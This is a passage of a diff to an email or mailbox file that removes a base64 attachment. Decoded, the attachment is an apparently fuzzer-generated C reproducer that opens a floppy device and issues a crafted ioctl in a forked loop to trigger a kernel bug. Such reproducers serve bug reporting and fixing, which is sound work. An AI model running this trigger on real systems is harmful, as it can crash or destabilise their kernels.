-MV0gPSAwOwogIGludCBsZW4gPSBzdHJsZW4oYnVmKTsKICBpbnQgZmQgPSBv
-cGVuKGZpbGUsIE9fV1JPTkxZIHwgT19DTE9FWEVDKTsKICBpZiAoZmQgPT0g
-LTEpCiAgICByZXR1cm4gZmFsc2U7CiAgaWYgKHdyaXRlKGZkLCBidWYsIGxl
-bikgIT0gbGVuKSB7CiAgICBpbnQgZXJyID0gZXJybm87CiAgICBjbG9zZShm
-ZCk7CiAgICBlcnJubyA9IGVycjsKICAgIHJldHVybiBmYWxzZTsKICB9CiAg
-Y2xvc2UoZmQpOwogIHJldHVybiB0cnVlOwp9CgpzdGF0aWMgbG9uZyBzeXpf
-b3Blbl9kZXYodm9sYXRpbGUgbG9uZyBhMCwgdm9sYXRpbGUgbG9uZyBhMSwg
-dm9sYXRpbGUgbG9uZyBhMikKewogIGlmIChhMCA9PSAweGMgfHwgYTAgPT0g
-MHhiKSB7CiAgICBjaGFyIGJ1ZlsxMjhdOwogICAgc3ByaW50ZihidWYsICIv
-ZGV2LyVzLyVkOiVkIiwgYTAgPT0gMHhjID8gImNoYXIiIDogImJsb2NrIiwg
-KHVpbnQ4X3QpYTEsCiAgICAgICAgICAgICh1aW50OF90KWEyKTsKICAgIHJl
-dHVybiBvcGVuKGJ1ZiwgT19SRFdSLCAwKTsKICB9IGVsc2UgewogICAgY2hh
-ciBidWZbMTAyNF07CiAgICBjaGFyKiBoYXNoOwogICAgc3RybmNweShidWYs
-IChjaGFyKilhMCwgc2l6ZW9mKGJ1ZikgLSAxKTsKICAgIGJ1ZltzaXplb2Yo
-YnVmKSAtIDFdID0gMDsKICAgIHdoaWxlICgoaGFzaCA9IHN0cmNocihidWYs
-ICcjJykpKSB7CiAgICAgICpoYXNoID0gJzAnICsgKGNoYXIpKGExICUgMTAp
-OwogICAgICBhMSAvPSAxMDsKICAgIH0KICAgIHJldHVybiBvcGVuKGJ1Ziwg
-YTIsIDApOwogIH0KfQoKc3RhdGljIHZvaWQga2lsbF9hbmRfd2FpdChpbnQg
-cGlkLCBpbnQqIHN0YXR1cykKewogIGtpbGwoLXBpZCwgU0lHS0lMTCk7CiAg
-a2lsbChwaWQsIFNJR0tJTEwpOwogIGZvciAoaW50IGkgPSAwOyBpIDwgMTAw
-OyBpKyspIHsKICAgIGlmICh3YWl0cGlkKC0xLCBzdGF0dXMsIFdOT0hBTkcg
-fCBfX1dBTEwpID09IHBpZCkKICAgICAgcmV0dXJuOwogICAgdXNsZWVwKDEw
-MDApOwogIH0KICBESVIqIGRpciA9IG9wZW5kaXIoIi9zeXMvZnMvZnVzZS9j
-b25uZWN0aW9ucyIpOwogIGlmIChkaXIpIHsKICAgIGZvciAoOzspIHsKICAg
-ICAgc3RydWN0IGRpcmVudCogZW50ID0gcmVhZGRpcihkaXIpOwogICAgICBp
-ZiAoIWVudCkKICAgICAgICBicmVhazsKICAgICAgaWYgKHN0cmNtcChlbnQt
-PmRfbmFtZSwgIi4iKSA9PSAwIHx8IHN0cmNtcChlbnQtPmRfbmFtZSwgIi4u
-IikgPT0gMCkKICAgICAgICBjb250aW51ZTsKICAgICAgY2hhciBhYm9ydFsz
-MDBdOwogICAgICBzbnByaW50ZihhYm9ydCwgc2l6ZW9mKGFib3J0KSwgIi9z
-eXMvZnMvZnVzZS9jb25uZWN0aW9ucy8lcy9hYm9ydCIsCiAgICAgICAgICAg
-ICAgIGVudC0+ZF9uYW1lKTsKICAgICAgaW50IGZkID0gb3BlbihhYm9ydCwg
-T19XUk9OTFkpOwogICAgICBpZiAoZmQgPT0gLTEpIHsKICAgICAgICBjb250
-aW51ZTsKICAgICAgfQogICAgICBpZiAod3JpdGUoZmQsIGFib3J0LCAxKSA8
-IDApIHsKICAgICAgfQogICAgICBjbG9zZShmZCk7CiAgICB9CiAgICBjbG9z
-ZWRpcihkaXIpOwogIH0gZWxzZSB7CiAgfQogIHdoaWxlICh3YWl0cGlkKC0x
-LCBzdGF0dXMsIF9fV0FMTCkgIT0gcGlkKSB7CiAgfQp9CgpzdGF0aWMgdm9p
-ZCBzZXR1cF90ZXN0KCkKewogIHByY3RsKFBSX1NFVF9QREVBVEhTSUcsIFNJ
-R0tJTEwsIDAsIDAsIDApOwogIHNldHBncnAoKTsKICB3cml0ZV9maWxlKCIv
-cHJvYy9zZWxmL29vbV9zY29yZV9hZGoiLCAiMTAwMCIpOwp9CgpzdHJ1Y3Qg
-dGhyZWFkX3QgewogIGludCBjcmVhdGVkLCBjYWxsOwogIGV2ZW50X3QgcmVh
-ZHksIGRvbmU7Cn07CgpzdGF0aWMgc3RydWN0IHRocmVhZF90IHRocmVhZHNb
-MTZdOwpzdGF0aWMgdm9pZCBleGVjdXRlX2NhbGwoaW50IGNhbGwpOwpzdGF0
-aWMgaW50IHJ1bm5pbmc7CgpzdGF0aWMgdm9pZCogdGhyKHZvaWQqIGFyZykK
-ewogIHN0cnVjdCB0aHJlYWRfdCogdGggPSAoc3RydWN0IHRocmVhZF90Kilh
-cmc7CiAgZm9yICg7OykgewogICAgZXZlbnRfd2FpdCgmdGgtPnJlYWR5KTsK
-ICAgIGV2ZW50X3Jlc2V0KCZ0aC0+cmVhZHkpOwogICAgZXhlY3V0ZV9jYWxs
-KHRoLT5jYWxsKTsKICAgIF9fYXRvbWljX2ZldGNoX3N1YigmcnVubmluZywg
-MSwgX19BVE9NSUNfUkVMQVhFRCk7CiAgICBldmVudF9zZXQoJnRoLT5kb25l
-KTsKICB9CiAgcmV0dXJuIDA7Cn0KCnN0YXRpYyB2b2lkIGV4ZWN1dGVfb25l
-KHZvaWQpCnsKICBpbnQgaSwgY2FsbCwgdGhyZWFkOwogIGZvciAoY2FsbCA9
-IDA7IGNhbGwgPCAyOyBjYWxsKyspIHsKICAgIGZvciAodGhyZWFkID0gMDsg
-dGhyZWFkIDwgKGludCkoc2l6ZW9mKHRocmVhZHMpIC8gc2l6ZW9mKHRocmVh
-ZHNbMF0pKTsKICAgICAgICAgdGhyZWFkKyspIHsKICAgICAgc3RydWN0IHRo
-cmVhZF90KiB0aCA9ICZ0aHJlYWRzW3RocmVhZF07CiAgICAgIGlmICghdGgt
-PmNyZWF0ZWQpIHsKICAgICAgICB0aC0+Y3JlYXRlZCA9IDE7CiAgICAgICAg
-ZXZlbnRfaW5pdCgmdGgtPnJlYWR5KTsKICAgICAgICBldmVudF9pbml0KCZ0
-aC0+ZG9uZSk7CiAgICAgICAgZXZlbnRfc2V0KCZ0aC0+ZG9uZSk7CiAgICAg
-ICAgdGhyZWFkX3N0YXJ0KHRociwgdGgpOwogICAgICB9CiAgICAgIGlmICgh
-ZXZlbnRfaXNzZXQoJnRoLT5kb25lKSkKICAgICAgICBjb250aW51ZTsKICAg
-ICAgZXZlbnRfcmVzZXQoJnRoLT5kb25lKTsKICAgICAgdGgtPmNhbGwgPSBj
-YWxsOwogICAgICBfX2F0b21pY19mZXRjaF9hZGQoJnJ1bm5pbmcsIDEsIF9f
-QVRPTUlDX1JFTEFYRUQpOwogICAgICBldmVudF9zZXQoJnRoLT5yZWFkeSk7
-CiAgICAgIGV2ZW50X3RpbWVkd2FpdCgmdGgtPmRvbmUsIDUwKTsKICAgICAg
-YnJlYWs7CiAgICB9CiAgfQogIGZvciAoaSA9IDA7IGkgPCAxMDAgJiYgX19h
-dG9taWNfbG9hZF9uKCZydW5uaW5nLCBfX0FUT01JQ19SRUxBWEVEKTsgaSsr
-KQogICAgc2xlZXBfbXMoMSk7Cn0KCnN0YXRpYyB2b2lkIGV4ZWN1dGVfb25l
-KHZvaWQpOwoKI2RlZmluZSBXQUlUX0ZMQUdTIF9fV0FMTAoKc3RhdGljIHZv
-aWQgbG9vcCh2b2lkKQp7CiAgaW50IGl0ZXIgPSAwOwogIGZvciAoOzsgaXRl
-cisrKSB7CiAgICBpbnQgcGlkID0gZm9yaygpOwogICAgaWYgKHBpZCA8IDAp
-CiAgICAgIGV4aXQoMSk7CiAgICBpZiAocGlkID09IDApIHsKICAgICAgc2V0
-dXBfdGVzdCgpOwogICAgICBleGVjdXRlX29uZSgpOwogICAgICBleGl0KDAp
-OwogICAgfQogICAgaW50IHN0YXR1cyA9IDA7CiAgICB1aW50NjRfdCBzdGFy
-dCA9IGN1cnJlbnRfdGltZV9tcygpOwogICAgZm9yICg7OykgewogICAgICBp
-ZiAod2FpdHBpZCgtMSwgJnN0YXR1cywgV05PSEFORyB8IFdBSVRfRkxBR1Mp
-ID09IHBpZCkKICAgICAgICBicmVhazsKICAgICAgc2xlZXBfbXMoMSk7CiAg
-ICAgIGlmIChjdXJyZW50X3RpbWVfbXMoKSAtIHN0YXJ0IDwgNTAwMCkKICAg
-ICAgICBjb250aW51ZTsKICAgICAga2lsbF9hbmRfd2FpdChwaWQsICZzdGF0
-dXMpOwogICAgICBicmVhazsKICAgIH0KICB9Cn0KCnVpbnQ2NF90IHJbMV0g
-PSB7MHhmZmZmZmZmZmZmZmZmZmZmfTsKCnZvaWQgZXhlY3V0ZV9jYWxsKGlu
-dCBjYWxsKQp7CiAgaW50cHRyX3QgcmVzID0gMDsKICBzd2l0Y2ggKGNhbGwp
-IHsKICBjYXNlIDA6CiAgICBtZW1jcHkoKHZvaWQqKTB4MjAwMDA4NDAsICIv
-ZGV2L2ZkI1wwMDAiLCA5KTsKICAgIHJlcyA9IC0xOwogICAgcmVzID0gc3l6
-X29wZW5fZGV2KDB4MjAwMDA4NDAsIDAsIDMpOwogICAgaWYgKHJlcyAhPSAt
-MSkKICAgICAgclswXSA9IHJlczsKICAgIGJyZWFrOwogIGNhc2UgMToKICAg
-ICoodWludDMyX3QqKTB4MjAwMDAxODAgPSAweDg4OwogICAgKih1aW50NjRf
-dCopMHgyMDAwMDE4OCA9IDA7CiAgICAqKHVpbnQ2NF90KikweDIwMDAwMTkw
-ID0gMDsKICAgICoodWludDY0X3QqKTB4MjAwMDAxOTggPSAwOwogICAgKih1
-aW50NjRfdCopMHgyMDAwMDFhMCA9IDA7CiAgICAqKHVpbnQ2NF90KikweDIw
-MDAwMWE4ID0gMDsKICAgICoodWludDMyX3QqKTB4MjAwMDAxYjAgPSAwOwog
-ICAgKih1aW50OF90KikweDIwMDAwMWI0ID0gNDsKICAgICoodWludDhfdCop
-MHgyMDAwMDFiNSA9IDA7CiAgICBtZW1jcHkoKHZvaWQqKTB4MjAwMDAxYjYs
-CiAgICAgICAgICAgIlx4ODJceDI5XHgxY1x4ODZceDQ0XHgzNlx4NWNceDdh
-XHhmN1x4MWNceGZkXHgxMVx4OTBceGE4XHgzOFx4ZDgiLAogICAgICAgICAg
-IDE2KTsKICAgICoodWludDhfdCopMHgyMDAwMDFjNiA9IDA7CiAgICBtZW1z
-ZXQoKHZvaWQqKTB4MjAwMDAxYzcsIDAsIDE2KTsKICAgICoodWludDMyX3Qq
-KTB4MjAwMDAxZDggPSAweDdmZmY7CiAgICAqKHVpbnQzMl90KikweDIwMDAw
-MWRjID0gMDsKICAgICoodWludDMyX3QqKTB4MjAwMDAxZTAgPSAwOwogICAg
-Kih1aW50MzJfdCopMHgyMDAwMDFlNCA9IDA7CiAgICBzeXNjYWxsKF9fTlJf
-aW9jdGwsIHJbMF0sIDB4MjU4LCAweDIwMDAwMTgwdWwpOwogICAgYnJlYWs7
-CiAgfQp9CmludCBtYWluKHZvaWQpCnsKICBzeXNjYWxsKF9fTlJfbW1hcCwg
-MHgxZmZmZjAwMHVsLCAweDEwMDB1bCwgMHVsLCAweDMydWwsIC0xLCAwdWwp
-OwogIHN5c2NhbGwoX19OUl9tbWFwLCAweDIwMDAwMDAwdWwsIDB4MTAwMDAw
-MHVsLCA3dWwsIDB4MzJ1bCwgLTEsIDB1bCk7CiAgc3lzY2FsbChfX05SX21t
-YXAsIDB4MjEwMDAwMDB1bCwgMHgxMDAwdWwsIDB1bCwgMHgzMnVsLCAtMSwg
-MHVsKTsKICBsb29wKCk7CiAgcmV0dXJuIDA7Cn0=
-
---000000000000f8f89e05ddae67d8--
+--Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)--
